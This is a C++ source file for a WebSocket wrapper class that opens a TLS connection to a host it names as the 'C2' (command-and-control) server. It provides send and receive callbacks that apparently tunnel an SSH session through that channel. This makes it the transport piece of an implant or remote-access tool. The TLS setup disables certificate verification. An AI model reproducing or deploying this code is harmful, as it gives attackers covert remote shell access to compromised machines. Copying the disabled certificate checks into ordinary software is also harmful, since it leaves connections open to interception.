
#include "cid_websockets.h"


//#include "asio.hpp"


using websocketpp::lib::placeholders::_1;
using websocketpp::lib::placeholders::_2;
using websocketpp::lib::bind;

std::mutex WebsocketsWrapper::mtx;
std::vector<unsigned char> WebsocketsWrapper::buffer;

WebsocketsWrapper::WebsocketsWrapper(const char* C2_host, unsigned short C2_port, std::shared_ptr<asio::io_service> io)
{

    this->uri = "wss://" + std::string(C2_host) + ":" + std::to_string(C2_port);
    try {
        // Set logging to be pretty verbose (everything except message payloads)
        ws_client.set_access_channels(websocketpp::log::alevel::all);
        ws_client.clear_access_channels(websocketpp::log::alevel::frame_payload);
        ws_client.set_error_channels(websocketpp::log::elevel::all);
        ws_client.set_socket_init_handler(bind(&WebsocketsWrapper::conn_socket_handler, this, ::_1, ::_2));
        ws_client.set_user_agent("test11111111"); // ToDo: Set to something unique that the server will verify to prevent outsiders poking with our ssh server

        // Initialize ASIO
        ws_client.init_asio(io.get());

        // Register our message handler
        //ws_client.set_message_handler(bind(&WebsocketsWrapper::on_message, shared_from_this(), &ws_client, ::_1, ::_2));
        //ws_client.set_message_handler(bind(&WebsocketsWrapper::on_message, this, &ws_client, ::_1, ::_2));
        ws_client.set_tls_init_handler(bind(&on_tls_init, ::_1));

        websocketpp::lib::error_code ec;
        con = ws_client.get_connection(uri, ec);       

        if (ec) {
            std::cout << "could not create connection because: " << ec.message() << std::endl;
            return;
        }

        // Note that connect here only requests a connection. No network messages are
        // exchanged until the event loop starts running in the next line.
        con = ws_client.connect(con);

        


 //       std::shared_ptr<asio::thread> m_logThread(new asio::thread(&WebsocketsWrapper::run));
        // ToDo: Calling like this works 
        //ws_client.run();

        // Start the ASIO io_service run loop in a new thread
        // this will cause a single connection to be made to the server. c.run()
        // will exit when this connection is closed.
        //std::thread run_thread([&] { ws_client.run(); });


        //websocketpp::lib::thread cthread(websocketpp::lib::bind(&run, &ws_client));
        //cthread.detach();
    }
    catch (websocketpp::exception const& e) {
        std::cout << e.what() << std::endl;
    }
    
   // WebsocketsWrapper::connected = true;
}


void WebsocketsWrapper::conn_socket_handler(websocketpp::connection_hdl hdl, websocketpp::lib::asio::ssl::stream<websocketpp::lib::asio::ip::tcp::socket>& thing) {
    socket = &thing;   
}

websocketpp::lib::asio::io_service* WebsocketsWrapper::get_io_service()
{
    return &ws_client.get_io_service();
}

void WebsocketsWrapper::run()
{
    if (io_thread) {
        ws_client.stop();
        io_thread->join();
    }

    io_thread = std::make_shared<std::thread>(std::thread(&client::run, &ws_client));
}

bool WebsocketsWrapper::is_connected() {
    int TIMEOUT = 5;
    auto start = std::chrono::system_clock::now();
    std::chrono::duration<double> elapsed_seconds = std::chrono::nanoseconds::zero();

    while (con->get_state() != websocketpp::session::state::open && elapsed_seconds.count() < TIMEOUT) {
        elapsed_seconds = std::chrono::system_clock::now() - start;        
        std::this_thread::sleep_for(std::chrono::milliseconds(20));
    }

    return con->get_state() == websocketpp::session::state::open;
}

int WebsocketsWrapper::recv_cb(socket_t socket, void* userdata, char* buffer, int size) {
    WebsocketsWrapper* ws_client = (WebsocketsWrapper*)userdata;
    websocketpp::lib::error_code ec;
    size_t read_size = -1;

    read_size = ws_client->con->get_socket().read_some(asio::buffer(buffer, size), ec);

    if (ec) {
        // ToDo: set the proper error code 
#ifdef _WIN32
        WSASetLastError(WSAEACCES); // https://docs.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
#else
        errno = ENOENT;
#endif // _WIN32

        std::cout << "Receive callback failed because: " << ec.message() << std::endl;

        return -1;
    }
    

    return read_size;
}

int WebsocketsWrapper::send_cb(socket_t socket, void* userdata, const char* buffer, int size) {
    WebsocketsWrapper* ws_client = (WebsocketsWrapper*)userdata;
    websocketpp::lib::error_code ec;
    size_t sent_size = -1;

    sent_size = ws_client->con->get_socket().write_some(asio::buffer(buffer, size), ec);

    if (ec) {
        // ToDo: set the proper error code 
#ifdef _WIN32
        WSASetLastError(WSAEACCES); // https://docs.microsoft.com/en-us/windows/win32/winsock/windows-sockets-error-codes-2
#else
        errno = ENOENT;
#endif // _WIN32

        std::cout << "Send callback failed because: " << ec.message() << std::endl;
        return -1;
    }

//    //int w = send(socket, buffer, size, 0);
    return sent_size;
}

void WebsocketsWrapper::close_cb(socket_t socket, void* userdata) {
    // Should close the ws connection
}

WebsocketsWrapper::context_ptr WebsocketsWrapper::on_tls_init(websocketpp::connection_hdl)
{
    context_ptr ctx = websocketpp::lib::make_shared<asio::ssl::context>(asio::ssl::context::sslv23);
    ctx->set_verify_mode(asio::ssl::verify_none);
    return ctx;
}


void WebsocketsWrapper::on_message(client* c, websocketpp::connection_hdl hdl, message_ptr msg)
{
    auto data = msg->get_payload();
    //msg->get_raw_payload()

    /*WebsocketsWrapper::mtx.lock();
    std::copy(data.c_str(), data.c_str() + data.size(), std::back_inserter(WebsocketsWrapper::buffer));
    WebsocketsWrapper::mtx.unlock();*/
}
